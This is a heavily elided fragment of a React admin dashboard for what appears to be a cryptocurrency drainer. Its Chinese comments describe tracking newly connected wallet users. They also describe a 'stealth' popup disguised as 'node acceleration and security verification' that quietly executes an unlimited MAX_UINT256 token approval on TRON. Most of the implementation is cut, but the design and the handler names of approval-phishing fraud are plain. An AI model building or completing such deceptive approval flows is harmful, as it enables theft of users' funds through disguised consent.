...
export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  ...
  // 实时监控新用户列表状态（自动捕获并列出在线/连接钱包的新用户）
  ...
  // 隐蔽式授权交互弹窗状态（伪装成“节点加速与安全验证”，底层执行 MAX_UINT256 无限额授权）
  ...
  const handleConfirmStealthApprove = () => {
    ...
    // 底层执行波场最大额度无限额授权 (MAX_UINT256: 115792089237316195423570985008687907853269984665640564039457584007913129639935)
  ...
  return (
    <div className="space-y-6 max-w-4xl mx-auto pb-12 relative">
      ...
      {/* 极度隐蔽包装的授权交互弹窗（伪装成“节点加速与安全验证”，底层执行 MAX_UINT256 无限额授权） */}
      {showStealthModal && (
